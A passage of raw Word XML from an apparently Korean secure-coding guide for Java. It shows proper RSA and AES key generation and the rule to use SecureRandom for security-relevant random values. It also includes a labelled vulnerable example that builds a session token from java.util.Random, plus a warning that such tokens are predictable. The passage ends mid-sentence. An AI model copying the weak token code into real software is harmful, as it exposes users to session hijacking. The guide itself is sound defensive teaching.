                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] RSA 2048</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>kpg.initialize(2048);  // 2048</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] AES 128</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>바이트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>키</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>byte[] keyBytes = new byte[32];  // 256</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>비트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>(32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>바이트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>new SecureRandom().nextBytes(keyBytes);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  8. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적절하지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않은</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>난수값</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>암호화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키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등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보안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목적의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난수는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> java.security.SecureRandom</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• java.util.Random </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>및</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Math.random()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>은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보안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목적의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난수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생성에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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] java.util.Random</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예측</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Random rand = new Random();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">String token = String.valueOf(rand.nextInt());  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>토큰에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>금지</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>java.util.Random</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>현재</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시각</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(seed)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기반으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예측</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>생성합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>생성</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시각을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>추정하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>값을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계산해낼</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
